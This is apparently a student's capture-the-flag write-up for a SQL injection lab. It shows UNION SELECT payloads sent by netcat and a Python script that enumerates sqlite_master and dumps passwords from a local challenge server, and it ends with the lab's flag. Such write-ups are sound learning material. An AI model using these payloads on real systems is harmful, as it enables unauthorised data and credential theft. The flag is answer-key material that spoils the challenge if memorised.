# challenge: SQLi 4

üìÖ 2026-02-16
üìÅ web security

---

## ‚úÖ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
table=users_* -> table's name starts with users_ but then it finishes randomly
colums=username, password
admin - [flag]
guest - password
here i made 2 different requests:
  - first one to retrieve table's full name using sqlite_master: 
        users_" UNION SELECT tbl_name FROM sqlite_master"  
  - second one to actually retrieve the flag:
        " UNION SELECT password FROM users_[copied the value printed before]"
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /?query=%22%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%22 HTTP/1.1'
        'Host: challenge.localhost'
-output: copied the table's name: users_*
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /?query=%22%20UNION%20SELECT%20password%20FROM%20users_[pasted the value]%22 HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
-clicked start
-opened the terminal
-ran: 'vim bro'
-typed: '#!/usr/bin/env python3'
        'import requests'
        'from bs4 import BeautifulSoup'
        'from pwn import *'
        'context.log_level = 'error''
        'url = "http://challenge.localhost:80/"'
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'params1 = {'
                '"query" : "" UNION SELECT tbl_name FROM sqlite_master\""'
                '}'
        'r = requests.get(url, params=params1)'
        'soup = BeautifulSoup(r.text, 'html.parser')'
        'pre = soup.find_all('pre')'
        'tabella = pre[-1].get_text()'
        'params2 = {'
                '"query" : f"\" UNION SELECT password FROM {tabella}\""'
                '}'
        'r = requests.get(url, params=params2)'
        'print(r.text)'
-ran: 'chmod a+x bro'
-ran: './bro'
-flag popped out

## üßëüèæ‚Äçüè´ what this challenge teaches u
obviously (but non for me in that moment), u can perform multiple query at the database and retrieve informations piecemeal
sqlite_master is the first table which stores every other tables info such as type, name, tbl_name ...
i found this usefull: https://www.sqlite.org/schematab.html
BeautifulSoup is a library which allows u to parse webpages 
in this case i created soup which contains the webpage
then i selected only strings surrounded by <pre> and picked the last one (table's name)
get_text() is a BeautifulSoup method that extracts only readable text

## üèÅ Flag  
pwn.college{EYZ7WuEyxjCKU4JfacctCnbsfm4.QXykzMzwCO4IDOxEzW}
